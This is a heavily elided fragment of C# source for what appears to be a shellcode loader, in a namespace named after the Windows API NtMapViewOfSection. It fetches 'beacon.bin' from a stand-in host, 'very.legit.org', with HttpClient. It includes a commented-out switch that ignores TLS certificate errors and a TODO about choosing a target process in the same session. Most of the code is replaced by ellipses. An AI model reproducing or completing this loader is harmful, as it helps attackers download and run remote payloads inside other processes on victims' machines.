...
namespace NtMapViewOfSection
{
    ...
    internal class Program
    {
        static async Task Main(string[] args)
        {
            ...
            {
                // Only needed if TLS certificate errors shall be ignored
                // handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    shellcode = await client.GetByteArrayAsync("https://very.legit.org/beacon.bin");
                }
            }
            ...
            // TODO: Assure that process belongs to our session!
